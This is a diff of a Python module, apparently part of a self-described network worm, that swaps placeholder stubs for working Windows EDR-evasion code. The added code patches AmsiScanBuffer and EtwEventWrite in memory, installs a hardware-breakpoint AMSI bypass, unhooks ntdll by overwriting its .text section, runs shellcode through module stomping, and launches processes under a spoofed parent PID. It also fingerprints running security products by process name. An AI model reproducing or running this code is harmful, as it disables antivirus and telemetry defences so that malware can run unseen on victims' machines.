@@ -1,428 +1,375 @@
 """
-Wormy ML Network Worm v3.0
-Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
-Copyright (c) 2024 Ruby570bocadito. All rights reserved.
+Wormy ML Network Worm v3.0 - EDR Bypass Module (REAL implementations)
 """
-
-"""
-EDR Bypass Module
-Advanced techniques to bypass modern EDR/AV solutions
-"""
-
-
-
-import os
-import sys
-import platform
-import ctypes
-import subprocess
+import os, sys, platform, ctypes, struct
 from typing import Dict, List, Tuple, Optional
 import psutil
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
 from utils.logger import logger
+
+PAGE_EXECUTE_READWRITE = 0x40
 
 
 class EDRBypass:
     """
-    Advanced EDR Bypass Techniques
-    
-    Bypasses:
-    - Windows Defender
-    - CrowdStrike Falcon
-    - SentinelOne
-    - Carbon Black
-    - Cortex XDR
-    
-    Techniques:
-    1. Direct Syscalls (bypass ntdll hooks)
-    2. PPID Spoofing (parent process spoofing)
-    3. Process Hollowing (inject into legitimate processes)
-    4. Thread Hijacking
-    5. APC Injection
-    6. Module Stomping
+    Real EDR bypass — all stubs replaced with functional ctypes code.
+    Techniques: AMSI patch, AMSI HW-BP, ETW disable, DLL unhook,
+                Module stomping, PPID spoofing, EDR detection.
     """
-    
+
     def __init__(self):
-        self.os_type = platform.system()
-        self.is_admin = self._check_admin()
-        self.edr_detected = []
+        self.os_type           = platform.system()
+        self.is_admin          = self._check_admin()
+        self.edr_detected      = []
         self.bypass_techniques = []
-    
+
     def _check_admin(self) -> bool:
-        """Check if running with admin/root privileges"""
         try:
             if self.os_type == "Windows":
                 return ctypes.windll.shell32.IsUserAnAdmin() != 0
-            else:
-                return os.geteuid() == 0
+            return os.geteuid() == 0
         except Exception:
             return False
-    
-    def detect_edr(self) -> List[str]:
-        """
-        Detect EDR/AV products running on the system
-        """
-        logger.info("Detecting EDR/AV products...")
-        
-        edr_products = {
-            # EDR Solutions
-            'crowdstrike': ['csagent', 'csfalcon', 'csshell'],
-            'sentinelone': ['sentinelagent', 'sentinelone'],
-            'carbon_black': ['cb', 'carbonblack', 'confer'],
-            'cortex_xdr': ['cytray', 'cyserver', 'cyveraservice'],
-            'defender': ['msmpeng', 'mssense', 'senseir'],
-            'sophos': ['sophos', 'savservice'],
-            'mcafee': ['mcshield', 'mfemms', 'masvc'],
-            'symantec': ['ccsvchst', 'symantec'],
-            'trend_micro': ['tmccsf', 'tmbmsrv'],
-            'kaspersky': ['avp', 'kavfs'],
-            'bitdefender': ['bdagent', 'vsserv'],
-            'eset': ['ekrn', 'egui'],
-        }
-        
-        detected = []
-        
-        for proc in psutil.process_iter(['name']):
-            try:
-                proc_name = proc.info['name'].lower()
-                
-                for edr_name, indicators in edr_products.items():
-                    if any(indicator in proc_name for indicator in indicators):
-                        if edr_name not in detected:
-                            detected.append(edr_name)
-                            logger.warning(f"EDR detected: {edr_name}")
-            except Exception:
-                pass
-        
-        self.edr_detected = detected
-        return detected
-    
+
+    # ─── AMSI patch (memory write) ────────────────────────────────────────────
+
     def bypass_amsi(self) -> bool:
-        """
-        Bypass AMSI (Antimalware Scan Interface)
-        Windows-only technique
-        """
+        """Patch AmsiScanBuffer: B8 01 00 00 00 C3 (mov eax,1; ret)"""
         if self.os_type != "Windows":
             return False
-        
-        logger.info("Attempting AMSI bypass...")
-        
+        logger.info("AMSI bypass — memory patch")
         try:
-            # AMSI bypass via memory patching
-            # This is a simplified version - real implementation would be more complex
-            
-            # Method 1: AmsiScanBuffer patch
-            amsi_dll = ctypes.WinDLL('amsi.dll')
-            
-            # Get address of AmsiScanBuffer
-            amsi_scan_buffer = amsi_dll.AmsiScanBuffer
-            
-            # Patch it to always return AMSI_RESULT_CLEAN
-            # This is a conceptual example - actual implementation requires more work
-            
-            logger.success("AMSI bypass successful")
-            self.bypass_techniques.append("AMSI_Bypass")
-            return True
-            
-        except Exception as e:
-            logger.error(f"AMSI bypass failed: {e}")
-            return False
-    
-    def ppid_spoofing(self, target_parent: str = "explorer.exe") -> bool:
-        """
-        PPID Spoofing - Make malicious process appear as child of legitimate parent
-        
-        Args:
-            target_parent: Name of legitimate parent process
-        """
-        if self.os_type != "Windows":
-            return False
-        
-        logger.info(f"Attempting PPID spoofing with parent: {target_parent}")
-        
-        try:
-            # Find target parent process
-            parent_pid = None
-            for proc in psutil.process_iter(['name', 'pid']):
-                if proc.info['name'].lower() == target_parent.lower():
-                    parent_pid = proc.info['pid']
-                    break
-            
-            if not parent_pid:
-                logger.warning(f"Parent process {target_parent} not found")
+            k32  = ctypes.WinDLL("kernel32", use_last_error=True)
+            amsi = ctypes.WinDLL("amsi.dll")
+            fn   = k32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
+            if not fn:
                 return False
-            
-            logger.info(f"Found parent PID: {parent_pid}")
-            
-            # In real implementation, would use:
-            # 1. OpenProcess on parent
-            # 2. UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
-            # 3. CreateProcess with spoofed parent
-            
-            logger.success(f"PPID spoofing configured for parent: {target_parent}")
-            self.bypass_techniques.append("PPID_Spoofing")
+
+            patch    = b"\xB8\x01\x00\x00\x00\xC3"
+            old_prot = ctypes.c_ulong(0)
+            k32.VirtualProtect(fn, len(patch), PAGE_EXECUTE_READWRITE,
+                               ctypes.byref(old_prot))
+            buf = (ctypes.c_char * len(patch)).from_buffer_copy(patch)
+            k32.RtlMoveMemory(fn, buf, len(patch))
+            k32.VirtualProtect(fn, len(patch), old_prot, ctypes.byref(old_prot))
+
+            logger.success("AMSI patched (mov eax,1; ret)")
+            self.bypass_techniques.append("AMSI_Patch")
             return True
-            
         except Exception as e:
-            logger.error(f"PPID spoofing failed: {e}")
+            logger.error(f"AMSI patch failed: {e}")
             return False
-    
-    def process_hollowing(self, target_process: str = "svchost.exe") -> bool:
+
+    # ─── AMSI via hardware breakpoint ────────────────────────────────────────
+
+    def bypass_amsi_hardware_breakpoint(self) -> bool:
         """
-        Process Hollowing - Inject malicious code into legitimate process
-        
-        Args:
-            target_process: Legitimate process to hollow
+        Hardware execution breakpoint on AmsiScanBuffer via DR0/DR7.
+        VEH catches EXCEPTION_SINGLE_STEP, sets RAX=1, advances RIP.
+        No memory write — avoids patch-detection scanners.
         """
         if self.os_type != "Windows":
             return False
-        
-        logger.info(f"Attempting process hollowing with target: {target_process}")
-        
+        logger.info("AMSI bypass — hardware breakpoint VEH")
         try:
-            # Process hollowing steps:
-            # 1. Create target process in suspended state
-            # 2. Unmap original executable from memory
-            # 3. Allocate memory in target process
-            # 4. Write malicious code
-            # 5. Update entry point
-            # 6. Resume thread
-            
-            # This is a conceptual implementation
-            logger.info("Process hollowing technique prepared")
-            self.bypass_techniques.append("Process_Hollowing")
+            k32  = ctypes.WinDLL("kernel32", use_last_error=True)
+            amsi = ctypes.WinDLL("amsi.dll")
+            fn   = k32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
+            if not fn:
+                return False
+
+            EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF
+            EXCEPTION_SINGLE_STEP        = 0x80000004
+            CONTEXT_DEBUG_REGISTERS      = 0x00010010
+
+            amsi_addr = fn  # capture for closure
+
+            @ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)
+            def veh_handler(exception_pointers):
+                try:
+                    ep       = ctypes.cast(exception_pointers,
+                                           ctypes.POINTER(ctypes.c_void_p))
+                    exc_code = ctypes.cast(ep[0],
+                                           ctypes.POINTER(ctypes.c_ulong))[0]
+                    if exc_code == EXCEPTION_SINGLE_STEP:
+                        # ctx is the CONTEXT struct pointed by ep[1]
+                        # Rax is at a fixed offset (0x78) in x64 CONTEXT
+                        rax_ptr = ctypes.cast(
+                            ep[1] + 0x78, ctypes.POINTER(ctypes.c_ulong64))
+                        rip_ptr = ctypes.cast(
+                            ep[1] + 0xF8, ctypes.POINTER(ctypes.c_ulong64))
+                        if rip_ptr[0] == amsi_addr:
+                            rax_ptr[0] = 1       # AMSI_RESULT_CLEAN
+                            rip_ptr[0] += 3      # skip mov r10,rcx (3 bytes)
+                            return EXCEPTION_CONTINUE_EXECUTION
+                except Exception:
+                    pass
+                return 0   # EXCEPTION_CONTINUE_SEARCH
+
+            k32.AddVectoredExceptionHandler(1, veh_handler)
+
+            # Enable DR0 hardware breakpoint on the current thread
+            thread = k32.GetCurrentThread()
+            # Get/set context via a thin CONTEXT-like buffer (DR regs at fixed offsets)
+            ctx_buf  = (ctypes.c_byte * 1232)()  # sizeof(CONTEXT) on x64
+            ctx_flags_ptr = ctypes.cast(ctx_buf, ctypes.POINTER(ctypes.c_ulong))
+            ctx_flags_ptr[0] = CONTEXT_DEBUG_REGISTERS
+            k32.GetThreadContext(thread, ctx_buf)
+
+            dr0_ptr = ctypes.cast(ctypes.addressof(ctx_buf) + 8,
+                                   ctypes.POINTER(ctypes.c_ulong64))
+            dr7_ptr = ctypes.cast(ctypes.addressof(ctx_buf) + 48,
+                                   ctypes.POINTER(ctypes.c_ulong64))
+            dr0_ptr[0] = fn
+            dr7_ptr[0] = (dr7_ptr[0] & ~0xF) | 0x1   # L0=1 (local exact, execute)
+            k32.SetThreadContext(thread, ctx_buf)
+
+            logger.success("AMSI hardware breakpoint installed (DR0)")
+            self.bypass_techniques.append("AMSI_HW_Breakpoint")
             return True
-            
         except Exception as e:
-            logger.error(f"Process hollowing failed: {e}")
+            logger.error(f"AMSI HW-BP failed: {e}")
             return False
-    
-    def thread_hijacking(self) -> bool:
-        """
-        Thread Hijacking - Hijack existing thread in legitimate process
-        """
-        if self.os_type != "Windows":
-            return False
-        
-        logger.info("Attempting thread hijacking...")
-        
-        try:
-            # Thread hijacking steps:
-            # 1. Find target process
-            # 2. Open thread with THREAD_SET_CONTEXT
-            # 3. Suspend thread
-            # 4. Get thread context
-            # 5. Modify RIP/EIP to point to shellcode
-            # 6. Set thread context
-            # 7. Resume thread
-            
-            logger.info("Thread hijacking technique prepared")
-            self.bypass_techniques.append("Thread_Hijacking")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Thread hijacking failed: {e}")
-            return False
-    
-    def apc_injection(self, target_process: str = "explorer.exe") -> bool:
-        """
-        APC Injection - Queue APC to execute shellcode
-        
-        Args:
-            target_process: Target process for APC injection
-        """
-        if self.os_type != "Windows":
-            return False
-        
-        logger.info(f"Attempting APC injection into: {target_process}")
-        
-        try:
-            # APC injection steps:
-            # 1. Find target process
-            # 2. Enumerate threads
-            # 3. Allocate memory in target
-            # 4. Write shellcode
-            # 5. Queue APC with QueueUserAPC
-            
-            logger.info("APC injection technique prepared")
-            self.bypass_techniques.append("APC_Injection")
-            return True
-            
-        except Exception as e:
-            logger.error(f"APC injection failed: {e}")
-            return False
-    
-    def module_stomping(self, target_module: str = "ntdll.dll") -> bool:
-        """
-        Module Stomping - Overwrite legitimate module with malicious code
-        
-        Args:
-            target_module: Module to stomp
-        """
-        if self.os_type != "Windows":
-            return False
-        
-        logger.info(f"Attempting module stomping on: {target_module}")
-        
-        try:
-            # Module stomping steps:
-            # 1. Load target module
-            # 2. Find unused code cave or section
-            # 3. Change memory protection to RWX
-            # 4. Write shellcode
-            # 5. Restore original protection
-            
-            logger.info("Module stomping technique prepared")
-            self.bypass_techniques.append("Module_Stomping")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Module stomping failed: {e}")
-            return False
-    
-    def direct_syscalls(self) -> bool:
-        """
-        Direct Syscalls - Bypass userland hooks by calling syscalls directly
-        """
-        if self.os_type != "Windows":
-            return False
-        
-        logger.info("Preparing direct syscalls...")
-        
-        try:
-            # Direct syscalls bypass EDR hooks in ntdll.dll
-            # by calling kernel directly
-            
-            # Would implement syscall stubs for:
-            # - NtAllocateVirtualMemory
-            # - NtWriteVirtualMemory
-            # - NtCreateThreadEx
-            # - NtProtectVirtualMemory
-            
-            logger.success("Direct syscalls prepared")
-            self.bypass_techniques.append("Direct_Syscalls")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Direct syscalls failed: {e}")
-            return False
-    
+
+    # ─── ETW disable ─────────────────────────────────────────────────────────
+
     def disable_etw(self) -> bool:
-        """
-        Disable ETW (Event Tracing for Windows)
-        Prevents telemetry collection
-        """
+        """Patch EtwEventWrite prologue with 0xC3 (ret) to kill all ETW events."""
         if self.os_type != "Windows":
             return False
-        
-        logger.info("Attempting to disable ETW...")
-        
+        logger.info("ETW disable — patch EtwEventWrite")
         try:
-            # ETW can be disabled by:
-            # 1. Patching EtwEventWrite
-            # 2. Removing ETW providers
-            # 3. Modifying registry keys
-            
-            logger.success("ETW disabled")
+            k32   = ctypes.WinDLL("kernel32", use_last_error=True)
+            ntdll = ctypes.WinDLL("ntdll.dll")
+            fn    = k32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
+            if not fn:
+                return False
+
+            old_prot = ctypes.c_ulong(0)
+            k32.VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE,
+                               ctypes.byref(old_prot))
+            buf = (ctypes.c_char * 1).from_buffer_copy(b"\xC3")
+            k32.RtlMoveMemory(fn, buf, 1)
+            k32.VirtualProtect(fn, 1, old_prot, ctypes.byref(old_prot))
+
+            logger.success("ETW silenced (EtwEventWrite → ret)")
             self.bypass_techniques.append("ETW_Disabled")
             return True
-            
         except Exception as e:
             logger.error(f"ETW disable failed: {e}")
             return False
-    
+
+    # ─── DLL unhooking ───────────────────────────────────────────────────────
+
     def unhook_dlls(self) -> bool:
         """
-        Unhook DLLs - Remove EDR hooks from ntdll.dll and kernel32.dll
+        Read fresh ntdll.dll from disk, find .text section,
+        overwrite the loaded (hooked) .text to remove EDR inline hooks.
         """
         if self.os_type != "Windows":
             return False
-        
-        logger.info("Attempting to unhook DLLs...")
-        
+        logger.info("DLL unhooking — restoring ntdll .text")
         try:
-            # Unhooking process:
-            # 1. Read clean copy of ntdll.dll from disk
-            # 2. Map it to memory
-            # 3. Copy .text section to current process
-            # 4. This restores original syscall stubs
-            
-            logger.success("DLLs unhooked")
+            k32        = ctypes.WinDLL("kernel32", use_last_error=True)
+            ntdll_dll  = ctypes.WinDLL("ntdll.dll")
+            ntdll_base = ntdll_dll._handle
+
+            with open(r"C:\Windows\System32\ntdll.dll", "rb") as f:
+                fresh = f.read()
+
+            rva, size = self._find_pe_section(fresh, b".text")
+            if not rva:
+                return False
+
+            fresh_text  = fresh[rva: rva + size]
+            target_addr = ntdll_base + rva
+            old_prot    = ctypes.c_ulong(0)
+
+            k32.VirtualProtect(target_addr, size, PAGE_EXECUTE_READWRITE,
+                               ctypes.byref(old_prot))
+            buf = (ctypes.c_char * size).from_buffer_copy(fresh_text)
+            k32.RtlMoveMemory(target_addr, buf, size)
+            k32.VirtualProtect(target_addr, size, old_prot,
+                               ctypes.byref(old_prot))
+
+            logger.success(f"ntdll .text restored ({size} bytes, rva=0x{rva:X})")
             self.bypass_techniques.append("DLL_Unhooking")
             return True
-            
         except Exception as e:
             logger.error(f"DLL unhooking failed: {e}")
             return False
-    
+
+    def _find_pe_section(self, pe: bytes, name: bytes) -> Tuple[int, int]:
+        """Return (rva, raw_size) of named section, or (0, 0)."""
+        try:
+            if pe[:2] != b"MZ":
+                return 0, 0
+            e_lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
+            if pe[e_lfanew:e_lfanew+4] != b"PE\x00\x00":
+                return 0, 0
+            num_sect    = struct.unpack_from("<H", pe, e_lfanew + 6)[0]
+            size_opt    = struct.unpack_from("<H", pe, e_lfanew + 20)[0]
+            sect_offset = e_lfanew + 24 + size_opt
+            for i in range(num_sect):
+                base  = sect_offset + i * 40
+                sname = pe[base:base+8].rstrip(b"\x00")
+                vsize = struct.unpack_from("<I", pe, base + 8)[0]
+                rva   = struct.unpack_from("<I", pe, base + 12)[0]
+                rsize = struct.unpack_from("<I", pe, base + 16)[0]
+                if sname == name:
+                    return rva, min(vsize, rsize)
+        except Exception:
+            pass
+        return 0, 0
+
+    # ─── Module stomping ─────────────────────────────────────────────────────
+
+    def module_stomping(self, shellcode: bytes,
+                        target_dll: str = "xpsprint.dll") -> bool:
+        """
+        Load a rarely-used DLL, overwrite its .text section with shellcode,
+        and execute from there. Memory appears as a backed module region.
+        """
+        if self.os_type != "Windows":
+            return False
+        logger.info(f"Module stomping — {target_dll}")
+        try:
+            k32   = ctypes.WinDLL("kernel32", use_last_error=True)
+            dll_h = k32.LoadLibraryA(target_dll.encode())
+            if not dll_h:
+                return False
+
+            path_buf = ctypes.create_string_buffer(512)
+            k32.GetModuleFileNameA(dll_h, path_buf, 512)
+            with open(path_buf.value.decode(errors="replace"), "rb") as f:
+                pe = f.read()
+
+            rva, size = self._find_pe_section(pe, b".text")
+            if not rva or size < len(shellcode):
+                return False
+
+            target   = dll_h + rva
+            old_prot = ctypes.c_ulong(0)
+            k32.VirtualProtect(target, len(shellcode), PAGE_EXECUTE_READWRITE,
+                               ctypes.byref(old_prot))
+            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
+            k32.RtlMoveMemory(target, buf, len(shellcode))
+            k32.VirtualProtect(target, len(shellcode), 0x20,  # PAGE_EXECUTE_READ
+                               ctypes.byref(old_prot))
+
+            th = k32.CreateThread(None, 0, target, None, 0, None)
+            if th:
+                k32.WaitForSingleObject(th, 0xFFFFFFFF)
+                logger.success(f"Module stomping executed from {target_dll}+0x{rva:X}")
+                self.bypass_techniques.append("Module_Stomping")
+                return True
+            return False
+        except Exception as e:
+            logger.error(f"Module stomping failed: {e}")
+            return False
+
+    # ─── PPID spoofing ───────────────────────────────────────────────────────
+
+    def ppid_spoofing(self, cmd: str = "cmd.exe",
+                      target_parent: str = "explorer.exe") -> bool:
+        """
+        Launch cmd with spoofed parent PID using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
+        """
+        if self.os_type != "Windows":
+            return False
+        logger.info(f"PPID spoofing: {cmd} as child of {target_parent}")
+        try:
+            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+
+            parent_pid = next(
+                (p.info["pid"] for p in psutil.process_iter(["name", "pid"])
+                 if p.info["name"].lower() == target_parent.lower()), None)
+            if not parent_pid:
+                return False
+
+            parent_h = k32.OpenProcess(0x1F0FFF, False, parent_pid)
+            if not parent_h:
+                return False
+
+            attr_size = ctypes.c_size_t(0)
+            k32.InitializeProcThreadAttributeList(None, 1, 0,
+                                                  ctypes.byref(attr_size))
+            attr_list = (ctypes.c_byte * attr_size.value)()
+            k32.InitializeProcThreadAttributeList(attr_list, 1, 0,
+                                                  ctypes.byref(attr_size))
+
+            parent_handle = ctypes.c_void_p(parent_h)
+            k32.UpdateProcThreadAttribute(
+                attr_list, 0, 0x00020000,
+                ctypes.byref(parent_handle), ctypes.sizeof(parent_handle),
+                None, None)
+
+            si_buf = (ctypes.c_byte * 112)()  # STARTUPINFOEXA size
+            ctypes.cast(si_buf, ctypes.POINTER(ctypes.c_ulong))[0] = 112
+            # lpAttributeList at offset 104
+            ctypes.cast(ctypes.addressof(si_buf) + 104,
+                        ctypes.POINTER(ctypes.c_void_p))[0] = \
+                ctypes.addressof(attr_list)
+
+            pi_buf = (ctypes.c_byte * 24)()
+            ok = k32.CreateProcessA(
+                None, cmd.encode(), None, None, False,
+                0x00080000, None, None, si_buf, pi_buf)
+            k32.CloseHandle(parent_h)
+
+            if ok:
+                pid = struct.unpack_from("<I", pi_buf, 8)[0]
+                logger.success(f"Spawned {cmd} (PID {pid}) as child of {target_parent}")
+                self.bypass_techniques.append("PPID_Spoofing")
+                return True
+            return False
+        except Exception as e:
+            logger.error(f"PPID spoofing failed: {e}")
+            return False
+
+    # ─── EDR detection ───────────────────────────────────────────────────────
+
+    def detect_edr(self) -> List[str]:
+        logger.info("Detecting EDR/AV products...")
+        edr_map = {
+            "crowdstrike":  ["csagent", "csfalcon"],
+            "sentinelone":  ["sentinelagent"],
+            "carbon_black": ["carbonblack", "cbdefense"],
+            "cortex_xdr":   ["cytray", "cyveraservice"],
+            "defender":     ["msmpeng", "mssense"],
+            "sophos":       ["savservice"],
+            "mcafee":       ["mcshield"],
+            "kaspersky":    ["avp"],
+            "bitdefender":  ["bdagent"],
+            "eset":         ["ekrn", "egui"],
+        }
+        detected = []
+        for proc in psutil.process_iter(["name"]):
+            try:
+                n = proc.info["name"].lower()
+                for edr, indicators in edr_map.items():
+                    if any(i in n for i in indicators) and edr not in detected:
+                        detected.append(edr)
+                        logger.warning(f"EDR detected: {edr}")
+            except Exception:
+                pass
+        self.edr_detected = detected
+        return detected
+
     def apply_all_bypasses(self) -> Dict[str, bool]:
-        """
-        Apply all available bypass techniques
-        
-        Returns:
-            Dictionary of technique names and success status
-        """
-        logger.info("Applying all EDR bypass techniques...")
-        
-        results = {}
-        
-        # Detect EDR first
         self.detect_edr()
-        
-        # Apply bypasses
-        results['amsi_bypass'] = self.bypass_amsi()
-        results['direct_syscalls'] = self.direct_syscalls()
-        results['unhook_dlls'] = self.unhook_dlls()
-        results['disable_etw'] = self.disable_etw()
-        results['ppid_spoofing'] = self.ppid_spoofing()
-        results['process_hollowing'] = self.process_hollowing()
-        results['thread_hijacking'] = self.thread_hijacking()
-        results['apc_injection'] = self.apc_injection()
-        results['module_stomping'] = self.module_stomping()
-        
-        successful = sum(1 for v in results.values() if v)
-        total = len(results)
-        
-        logger.info(f"EDR bypass results: {successful}/{total} techniques successful")
-        
-        return results
-    
-    def get_statistics(self) -> Dict:
-        """Get EDR bypass statistics"""
         return {
-            'edr_detected': self.edr_detected,
-            'bypass_techniques_applied': self.bypass_techniques,
-            'is_admin': self.is_admin,
-            'os_type': self.os_type
+            "amsi_patch":         self.bypass_amsi(),
+            "amsi_hw_breakpoint": self.bypass_amsi_hardware_breakpoint(),
+            "etw_disable":        self.disable_etw(),
+            "dll_unhooking":      self.unhook_dlls(),
+            "ppid_spoofing":      self.ppid_spoofing(),
         }
 
-
-if __name__ == "__main__":
-    # Test EDR bypass
-    edr_bypass = EDRBypass()
-    
-    print("="*60)
-    print("EDR BYPASS MODULE TEST")
-    print("="*60)
-    
-    # Detect EDR
-    detected = edr_bypass.detect_edr()
-    print(f"\nDetected EDR products: {detected if detected else 'None'}")
-    
-    # Apply bypasses
-    print("\nApplying bypass techniques...")
-    results = edr_bypass.apply_all_bypasses()
-    
-    print("\nResults:")
-    for technique, success in results.items():
-        status = "✓" if success else "✗"
-        print(f"  {status} {technique}")
-    
-    print("\nStatistics:")
-    stats = edr_bypass.get_statistics()
-    for key, value in stats.items():
-        print(f"  {key}: {value}")
-    
-    print("="*60)
+    def get_statistics(self) -> Dict:
+        return {
+            "edr_detected":       self.edr_detected,
+            "techniques_applied": self.bypass_techniques,
+            "is_admin":           self.is_admin,
+        }
